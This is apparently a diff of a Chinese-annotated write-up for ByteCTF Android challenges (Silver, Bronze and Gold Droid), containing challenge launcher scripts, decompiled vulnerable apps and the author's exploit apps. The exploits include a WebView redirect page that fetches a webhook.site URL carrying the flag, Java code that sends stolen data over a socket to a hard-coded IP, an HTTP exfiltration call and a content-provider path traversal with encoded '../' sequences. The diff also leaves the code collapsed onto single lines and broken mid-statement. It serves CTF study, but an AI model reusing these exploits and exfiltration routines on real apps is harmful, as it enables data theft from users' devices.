  return subprocess.Popen( "emulator" + " -avd pixel_xl_api_30" + " -no-cache" + " -no-snapstorage" + " -no-snapshot-save" + " -no-snapshot-load" + " -no-audio" + " -no-window" + " -no-snapshot" + " -no-boot-anim" + " -wipe-data" + " -accel on" + " -netdelay none" + " -no-sim" + " -netspeed full" + " -delay-adb" + " -port {}".format(EMULATOR_PORT) + ("" if isMacos else " > /dev/null 2> /dev/null ") + "", env=ENV, close_fds=True, shell=True, #通过操作系统的 shell 执行指定的命令 preexec_fn=os.setsid)
@@ -448,76 +465,71 @@ def adb_broadcast(action, receiver, extras=None): args = ["shell", "su", "root",
 
 print_to_user(r"""[0;1;35;95m░█[0;1;31;91m▀▀[0;1;33;93m░█[0;1;32;92m░░[0;1;36;96m░▀[0;1;34;94m█▀[0;1;35;95m░█[0;1;31;91m░█[0;1;33;93m░█[0;1;32;92m▀▀[0;1;36;96m░█[0;1;34;94m▀▄[0;1;35;95m░█[0;1;31;91m▀▄[0;1;33;93m░█[0;1;32;92m▀▄[0;1;36;96m░█[0;1;34;94m▀█[0;1;35;95m░▀[0;1;31;91m█▀[0;1;33;93m░█[0;1;32;92m▀▄[0m[0;1;31;91m░▀[0;1;33;93m▀█[0;1;32;92m░█[0;1;36;96m░░[0;1;34;94m░░[0;1;35;95m█░[0;1;31;91m░▀[0;1;33;93m▄▀[0;1;32;92m░█[0;1;36;96m▀▀[0;1;34;94m░█[0;1;35;95m▀▄[0;1;31;91m░█[0;1;33;93m░█[0;1;32;92m░█[0;1;36;96m▀▄[0;1;34;94m░█[0;1;35;95m░█[0;1;31;91m░░[0;1;33;93m█░[0;1;32;92m░█[0;1;36;96m░█[0m[0;1;33;93m░▀[0;1;32;92m▀▀[0;1;36;96m░▀[0;1;34;94m▀▀[0;1;35;95m░▀[0;1;31;91m▀▀[0;1;33;93m░░[0;1;32;92m▀░[0;1;36;96m░▀[0;1;34;94m▀▀[0;1;35;95m░▀[0;1;31;91m░▀[0;1;33;93m░▀[0;1;32;92m▀░[0;1;36;96m░▀[0;1;34;94m░▀[0;1;35;95m░▀[0;1;31;91m▀▀[0;1;33;93m░▀[0;1;32;92m▀▀[0;1;36;96m░▀[0;1;34;94m▀░[0m""")
 if not isMacos: if not proof_of_work(): print_to_user("Please proof of work again, exit...n") exit(-1)
-print_to_user("Please enter your poc url:")url = sys.stdin.readline().strip()# url should be like "https://xxx" to to ensure that `adb shell` passes intent.data correctly.if url.strip('"') == url: url = f'"{url}"'if not url.startswith('"https://'): print_to_user("Invalid poc url.n") exit(-1)
+print_to_user("Please enter your poc url:")url = sys.stdin.readline().strip()
+# url should be like "https://xxx" to to ensure that `adb shell` passes intent.data correctly.if url.strip('"') == url: url = f'"{url}"'if not url.startswith('"https://'): print_to_user("Invalid poc url.n") exit(-1)
 print_to_user("Preparing android emulator. This may takes about 2 minutes...n")emulator = setup_emulator()#只有连接上了模拟器/设备连接上了adb，服务才会被执行，而在Android系统完全启动前执行就会有错误发生adb(["wait-for-device"])
-adb_install(APK_FILE) #将apk文件装到模拟器中with open(FLAG_FILE, "r") as f: adb_broadcast(f"com.wuhengctf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()})#adb shell su root am broadcast -W -a "com.wuhengctf.SET_FLAG" -n "com.bytectf.silverdroid/.FlagReceiver" -e 'flag' 'flag{eeeeeeee}'#am broadcast 发送广播#-a com.wuhengctf.SET_FLAG:指定intent操作，如android.intent.action.VIEW,Intent intent = new Intent(); intent.setAction("android.SET_FLAG");#-n "com.bytectf.silverdroid/.FlagReceiver": 确定接收者#-e 'flag' 'flag{eeeeeeee}': 字符串
+adb_install(APK_FILE) #将apk文件装到模拟器中with open(FLAG_FILE, "r") as f: adb_broadcast(f"com.wuhengctf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()})#adb shell su root am broadcast -W -a "com.wuhengctf.SET_FLAG" -n "com.bytectf.silverdroid/.FlagReceiver" -e 'flag' 'flag{eeeeeeee}'#am broadcast 发送广播#-a com.wuhengctf.SET_FLAG:
+指定intent操作，如android.intent.action.VIEW,Intent intent = new Intent(); intent.setAction("android.SET_FLAG");#-n "com.bytectf.silverdroid/.FlagReceiver": 确定接收者#-e 'flag' 'flag{eeeeeeee}': 字符串
 
-adb_activity(f"{VULER}/.MainActivity", wait=True, data=url)# adb shell am start -W -n "com.bytectf.silverdroid/.MainActivity" -d "url"#-n "com.bytectf.silverdroid/.MainActivity":启动MainActivity#-d "url":传递url给MainActivity，而silver droid程序通过Uri uri0 = this.getIntent().getData()接收url
+adb_activity(f"{VULER}/.MainActivity", wait=True, data=url)
+# adb shell am start -W -n "com.bytectf.silverdroid/.MainActivity" -d "url"#-n "com.bytectf.silverdroid/.MainActivity":
+启动MainActivity#-d "url":
+传递url给MainActivity，而silver droid程序通过Uri uri0 = this.getIntent().getData()接收url
 
 print_to_user("Launching! Let your apk fly for a while...n")
 if isMacos: input('wait for debug')else: time.sleep(EXPLOIT_TIME_SECS)
 print_to_user("exiting......")
-try: os.killpg(os.getpgid(emulator.pid), signal.SIGTERM) os.killpg(os.getpgid(os.getpid()), signal.SIGTERM)except: pass
-```
-
-
-
-```
+try: os.killpg(os.getpgid(emulator.pid), signal.SIGTERM) os.killpg(os.getpgid(os.getpid()), signal.SIGTERM)
+except: pass
 package com.bytectf.silverdroid;
-import android.net.Uri;import android.os.Bundle;import android.util.Log;import android.webkit.WebResourceRequest;import android.webkit.WebResourceResponse;import android.webkit.WebView;import android.webkit.WebViewClient;import androidx.appcompat.app.AppCompatActivity;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.util.HashMap;
-public class MainActivity extends AppCompatActivity { @Override // androidx.fragment.app.FragmentActivity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:activity_main Uri uri0 = this.getIntent().getData(); //获得intent所传过来的data参数，可以来自另一个app if(uri0 != null) { //若参数不为null WebView webView = new WebView(this.getApplicationContext());//新建的页面取得是整个app的context webView.setWebViewClient(new WebViewClient() { //当从一个网页跳转到另外一个网页时，我们希望目标网页仍然在当前的webview中显示，而不是在浏览器中打开 @Override // android.webkit.WebViewClient public boolean shouldOverrideUrlLoading(WebView view, String url) { //当shouldOverrideUrlLoading返回值为true，拦截webview加载url try { Uri uri0 = Uri.parse(url); //解析url Log.e("Hint", "Try to upload your poc on free COS: https://cloud.tencent.com/document/product/436/6240"); if(uri0.getScheme().equals("https")) { //scheme必须是https return !uri0.getHost().endsWith(".myqcloud.com");//若是以.myqcloud.com结尾，返回true，再取反返回false，不会拦截webview加载url } } catch(Exception e) { e.printStackTrace(); return true; }
+import android.net.Uri;
+import android.os.Bundle;
+import android.util.Log;
+import android.webkit.WebResourceRequest;
+import android.webkit.WebResourceResponse;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
+import androidx.appcompat.app.AppCompatActivity;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.util.HashMap;
+public class MainActivity extends AppCompatActivity { @Override // androidx.fragment.app.FragmentActivity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:
+activity_main Uri uri0 = this.getIntent().getData(); //获得intent所传过来的data参数，可以来自另一个app if(uri0 != null) { //若参数不为null WebView webView = new WebView(this.getApplicationContext());//新建的页面取得是整个app的context webView.setWebViewClient(new WebViewClient() { //当从一个网页跳转到另外一个网页时，我们希望目标网页仍然在当前的webview中显示，而不是在浏览器中打开 @Override // android.webkit.WebViewClient public boolean shouldOverrideUrlLoading(WebView view, String url) { //当shouldOverrideUrlLoading返回值为true，拦截webview加载url try { Uri uri0 = Uri.parse(url); //解析url Log.e("Hint", "Try to upload your poc on free COS: https://cloud.tencent.com/document/product/436/6240"); if(uri0.getScheme().equals("https")) { //scheme必须是https return !uri0.getHost().endsWith(".myqcloud.com");//若是以.myqcloud.com结尾，返回true，再取反返回false，不会拦截webview加载url } } catch(Exception e) { e.printStackTrace(); return true; }
  return true; } }); webView.setWebViewClient(new WebViewClient() { @Override // android.webkit.WebViewClient public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) { //拦截url，js，css等响应阶段,拦截所有的url请求，若返回非空，则不再进行网络资源请求，而是使用返回的资源数据 FileInputStream inputStream; Uri uri0 = request.getUrl(); //获得js请求的request if(uri0.getPath().startsWith("/local_cache/")) { //检查域名后的path是否为/local_cache/开头 File cacheFile = new File(MainActivity.this.getCacheDir(), uri0.getLastPathSegment()); //只是在内存中创建File文件映射对象,而并不会在硬盘中创建文件，新建file以cache为目录，uri0的最后一个地址段 //getCacheDir获取手机中/data/data/包名/cache目录；
  if(cacheFile.exists()) { //若映射的文件真实存在，则进入下面循环 try { inputStream = new FileInputStream(cacheFile);//其将文件内容读取到了内存inputStream内，之后可以进行读取操作 } catch(IOException e) { return null; }
  HashMap headers = new HashMap(); headers.put("Access-Control-Allow-Origin", "*"); return new WebResourceResponse("text/html", "utf-8", 200, "OK", headers, inputStream); //返回响应 } }
  return super.shouldInterceptRequest(view, request); } }); this.setContentView(webView); // webView.getSettings().setJavaScriptEnabled(true); //设置WebView属性，能够执行Javascript脚本 webView.loadUrl("https://bytectf-1303079954.cos.ap-nanjing.myqcloud.com/jump.html?url=" + uri0); } }}
-```
-
-
-
-```
 <h1>jump</h1><script> function getQueryVariable(variable){ var query = window.location.search.substring(1); //window.location是获得当前页面的url地址，添上search之后表示从"?"开始的url，而substring(1)就是将"?"截掉。
  var vars = query.split("&"); //把query以"&"进行分割 for (var i=0;i<vars.length;i++) { var pair = vars[i].split("="); if(pair[0] == variable){return pair[1];} } return(false); //获得url参数 } var myurl = getQueryVariable("url").toString().toLowerCase();// if (myurl != 'false' && myurl.length > 1 && myurl.indexOf("myqcloud")==-1) { //myurl不能含有myqcloud window.location.href = myurl; //只表示打开这个url页面，并不是打开且刷新这个页面 }</script>
-```
-
-
-
-```
 <script> async function fetchTest(){
  fetch("https://webhook.site/bf5aa6d4-1b89-4eaf-a1dd-9b003555cd99/?flag=123")} (async () => {await fetchTest();})();</script>
-```
-
-
-
-```
 四
 Bronze Droid
-```
-
-
-
-```
 print_to_user("Please enter your apk url:")url = sys.stdin.readline().strip()EXP_FILE = download_file(url)if not check_apk(EXP_FILE): print_to_user("Invalid apk file.n") exit(-1)
 print_to_user("Preparing android emulator. This may takes about 2 minutes...n")emulator = setup_emulator()adb(["wait-for-device"])
 adb_install(APK_FILE) #安装受害者apkwith open(FLAG_FILE, "r") as f: adb_broadcast(f"com.bytectf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()})
 time.sleep(3)adb_install(EXP_FILE) #安装恶意apkadb_activity(f"{ATTACKER}/.MainActivity") #启动恶意apk的MainActivity
 print_to_user("Launching! Let your apk fly for a while...n")
-```
-
-
-
-```
 package com.bytectf.bronzedroid;
-import android.app.Activity;import android.os.Bundle;
-public class MainActivity extends Activity { @Override // android.app.Activity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:activity_main String s = this.getIntent().getAction(); //获得启动该Activity的intent的Action属性 if(s != null && (s.equals("ACTION_SHARET_TO_ME"))) { //判断 this.setResult(-1, this.getIntent()); //将某些数据回带给启动该Activity的Activity this.finish(); } }}
-```
-
-
-
-```
+import android.app.Activity;
+import android.os.Bundle;
+public class MainActivity extends Activity { @Override // android.app.Activity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:
+activity_main String s = this.getIntent().getAction(); //获得启动该Activity的intent的Action属性 if(s != null && (s.equals("ACTION_SHARET_TO_ME"))) { //判断 this.setResult(-1, this.getIntent()); //将某些数据回带给启动该Activity的Activity this.finish(); } }}
 package com.eeeetest.bronzedroid_pwn;
 import androidx.appcompat.app.AppCompatActivity;
-import android.content.Intent;import android.net.Uri;import android.os.Bundle;import android.util.Log;import android.widget.TextView;
-import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.io.OutputStream;import java.net.HttpURLConnection;import java.net.Socket;import java.net.URL;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Bundle;
+import android.util.Log;
+import android.widget.TextView;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.Socket;
+import java.net.URL;
 public class MainActivity extends AppCompatActivity {
  @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);
 
@@ -525,24 +537,9 @@ public class MainActivity extends AppCompatActivity {
  @Override //重写 public void onActivityResult(int requestCode, int resultCode, Intent data) { //得到回传的数据 super.onActivityResult(requestCode, resultCode, data); //重写 try { InputStreamReader inputStreamReader = new InputStreamReader(getContentResolver().openInputStream(data.getData())); char[] cArr = new char[1024]; StringBuffer stringBuffer = new StringBuffer(""); while (-1 != inputStreamReader.read(cArr, 0, 1024)) { stringBuffer.append(String.valueOf(cArr)); } //send(new String(stringBuffer)); String flag = new String(stringBuffer); ((TextView) findViewById(R.id.tv_show)).setText(new String(stringBuffer));
 
  } catch (Exception e) { e.printStackTrace(); } } }
-```
-
-
-
-```
 private void send(final String str) { //和服务器建立socket通信，将flag带入到服务器内 new Thread() { @Override public void run() { try { Socket socket = new Socket("47.101.67.103", 1235); sleep(1000L); if (socket.isConnected()) { System.out.println("connect succeed!"); OutputStream outputStream = socket.getOutputStream(); outputStream.write(str.getBytes()); outputStream.flush(); outputStream.close(); socket.close(); } } catch (Exception unused) { } } }.start();}
-```
-
-
-
-```
 五
 Gold Droid
-```
-
-
-
-```
 print_to_user("Please enter your apk url:")url = sys.stdin.readline().strip()EXP_FILE = download_file(url)if not check_apk(EXP_FILE): print_to_user("Invalid apk file.n") exit(-1)
 print_to_user("Preparing android emulator. This may takes about 2 minutes...n")emulator = setup_emulator()adb(["wait-for-device"])
 adb_install(APK_FILE) #安装受害apkadb_activity(f"{VULER}/.MainActivity") ###### 启动受害apk的MainActivitywith open(FLAG_FILE, "r") as f: adb_broadcast(f"com.bytectf.SET_FLAG", f"{VULER}/.FlagReceiver", extras={"flag": f.read()}) #发送flag
@@ -550,21 +547,24 @@ time.sleep(3)adb_install(EXP_FILE)adb_activity(f"{ATTACKER}/.MainActivity") #运
 print_to_user("Launching! Let your apk fly for a while...n")
 if isMacos: input('wait for debug')else: time.sleep(EXPLOIT_TIME_SECS)
 print_to_user("exiting......")
-```
-
-
-
-```
 package com.bytectf.golddroid;
-import android.os.Bundle;import androidx.appcompat.app.AppCompatActivity;import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.nio.charset.StandardCharsets;
-public class MainActivity extends AppCompatActivity { @Override // androidx.fragment.app.FragmentActivity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:activity_main File externalFile = new File(this.getExternalFilesDir("sandbox"), "file1"); //getExternalFilesDir对应的目录是/sdcard/Android/data/包名/files/，映射sandbox文件夹内的file1文件 try { FileOutputStream fileOutputStream = new FileOutputStream(externalFile); //创建externalFile文件 fileOutputStream.write("I'm in externaln".getBytes(StandardCharsets.UTF_8)); //写入 fileOutputStream.close(); } catch(IOException e) { e.printStackTrace(); } }}
-```
-
-
-
-```
+import android.os.Bundle;
+import androidx.appcompat.app.AppCompatActivity;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.nio.charset.StandardCharsets;
+public class MainActivity extends AppCompatActivity { @Override // androidx.fragment.app.FragmentActivity protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); this.setContentView(0x7F0B001C); // layout:
+activity_main File externalFile = new File(this.getExternalFilesDir("sandbox"), "file1"); //getExternalFilesDir对应的目录是/sdcard/Android/data/包名/files/，映射sandbox文件夹内的file1文件 try { FileOutputStream fileOutputStream = new FileOutputStream(externalFile); //创建externalFile文件 fileOutputStream.write("I'm in externaln".getBytes(StandardCharsets.UTF_8)); //写入 fileOutputStream.close(); } catch(IOException e) { e.printStackTrace(); } }}
 package com.bytectf.golddroid;
-import android.content.ContentProvider;import android.content.ContentValues;import android.database.Cursor;import android.net.Uri;import android.os.ParcelFileDescriptor;import java.io.File;import java.io.FileNotFoundException;import java.io.IOException;
+import android.content.ContentProvider;
+import android.content.ContentValues;
+import android.database.Cursor;
+import android.net.Uri;
+import android.os.ParcelFileDescriptor;
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.IOException;
 public class VulProvider extends ContentProvider { // @Override // android.content.ContentProvider public int delete(Uri uri, String selection, String[] selectionArgs) { return 0; }
  @Override // android.content.ContentProvider public String getType(Uri uri) { return null; }
  @Override // android.content.ContentProvider public Uri insert(Uri uri, ContentValues values) { return null; }
@@ -573,27 +573,15 @@ public class VulProvider extends ContentProvider { // @Override // android.conte
  return ParcelFileDescriptor.open(file, 0x10000000); //0x10000000代表只读 }
  @Override // android.content.ContentProvider public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) { return null; }
  @Override // android.content.ContentProvider public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) { return 0; }}
-```
-
-
-
-```
 public static ParcelFileDescriptor open(File file, int mode) throws FileNotFoundException { final FileDescriptor fd = openInternal(file, mode); if (fd == null) return null; return new ParcelFileDescriptor(fd);}
-```
-
-
-
-```
 private static FileDescriptor openInternal(File file, int mode) throws FileNotFoundException { final int flags = FileUtils.translateModePfdToPosix(mode) | ifAtLeastQ(O_CLOEXEC); int realMode = S_IRWXU | S_IRWXG; if ((mode & MODE_WORLD_READABLE) != 0) realMode |= S_IROTH; if ((mode & MODE_WORLD_WRITEABLE) != 0) realMode |= S_IWOTH; final String path = file.getPath(); //重新获得了path，没有用getCanonicalPath过滤，这样就存在目录穿越 try { return Os.open(path, flags, realMode); } catch (ErrnoException e) { throw new FileNotFoundException(e.getMessage()); }}
-```
-
-
-
-```
 package com.bytectf.test;
-import androidx.appcompat.app.AppCompatActivity;import java.io.File;import java.io.IOException;
+import androidx.appcompat.app.AppCompatActivity;
+import java.io.File;
+import java.io.IOException;
 
-import android.net.Uri;import android.os.Bundle;
+import android.net.Uri;
+import android.os.Bundle;
 public class MainActivity extends AppCompatActivity {
  @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); File file0 = new File("/data/data/com.bytectf.pwngolddroid/","cache"); //取得相对路径 System.out.println("file0 Path: " + file0.getPath());
  String path = "content://slipme/" + "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.bytectf.pwngolddroid%2Fsymlink"; Uri uri = Uri.parse(path); System.out.println("uri.getLastPathSegment:"+uri.getLastPathSegment()); //利用"%2F"绕过getLastPathSegment，让其存在目录穿越
@@ -601,17 +589,21 @@ public class MainActivity extends AppCompatActivity {
  try { if(!file1.getCanonicalPath().startsWith(file0.getCanonicalPath())) { ///////////// throw new IllegalArgumentException(); } } catch(IOException e) { e.printStackTrace(); } //取得绝对路径// try{// System.out.println("getCanonicalPath: "+ file.getCanonicalPath()); }// catch(Exception e){} }
 
  }
-```
-
-
-
-```
 package com.bytectf.pwngolddroid;
-import androidx.appcompat.app.AppCompatActivity;import android.content.ContentResolver;import android.net.Uri;import android.os.Bundle;import android.util.Log;
-import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.net.HttpURLConnection;import java.net.URL;
+import androidx.appcompat.app.AppCompatActivity;
+import android.content.ContentResolver;
+import android.net.Uri;
+import android.os.Bundle;
+import android.util.Log;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 
 public class MainActivity extends AppCompatActivity { String symlink;
- public void httpGet(String msg) { new Thread(new Runnable() { @Override public void run() { HttpURLConnection connection = null; BufferedReader reader = null; try { Log.e("in_httpGet","inHttpGet1"); URL url = new URL("http://ip:port/flag?flag=" + msg); //这里可以写自己博客的ip和端口，对其进行访问，然后查看日志，我的日志在/var/log/nginx/access.log Thread.sleep(1); Log.e("in_httpGet","inHttpGet2"); connection = (HttpURLConnection) url.openConnection(); Thread.sleep(1); Log.e("in_httpGet","inHttpGet3"); connection.setRequestMethod("GET"); Thread.sleep(1); Log.e("in_httpGet","inHttpGet4"); connection.getInputStream(); Thread.sleep(1); Log.e("httpget succeed","http_get succeed"); } catch (IOException | InterruptedException e) { e.printStackTrace(); } } }).start(); }
+ public void httpGet(String msg) { new Thread(new Runnable() { @Override public void run() { HttpURLConnection connection = null; BufferedReader reader = null; try { Log.e("in_httpGet","inHttpGet1"); URL url = new URL("http://ip:
+port/flag?flag=" + msg); //这里可以写自己博客的ip和端口，对其进行访问，然后查看日志，我的日志在/var/log/nginx/access.log Thread.sleep(1); Log.e("in_httpGet","inHttpGet2"); connection = (HttpURLConnection) url.openConnection(); Thread.sleep(1); Log.e("in_httpGet","inHttpGet3"); connection.setRequestMethod("GET"); Thread.sleep(1); Log.e("in_httpGet","inHttpGet4"); connection.getInputStream(); Thread.sleep(1); Log.e("httpget succeed","http_get succeed"); } catch (IOException | InterruptedException e) { e.printStackTrace(); } } }).start(); }
  private String readUri(Uri uri) { InputStream inputStream = null; try { ContentResolver contentResolver = getContentResolver(); inputStream = contentResolver.openInputStream(uri); if (inputStream != null) { byte[] buffer = new byte[1024]; int result; String content = ""; while ((result = inputStream.read(buffer)) != -1) { content = content.concat(new String(buffer, 0, result)); } return content; } } catch (IOException e) { Log.e("receiver", "IOException when reading uri", e); } catch (IllegalArgumentException e) { Log.e("receiver", "IllegalArgumentException", e); } finally { if (inputStream != null) { try { inputStream.close(); } catch (IOException e) { Log.e("receiver", "IOException when closing stream", e); } } } return null; } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main);
  String root = getApplicationInfo().dataDir; symlink = root + "/symlink"; try {
  Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor(); } catch (InterruptedException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); }
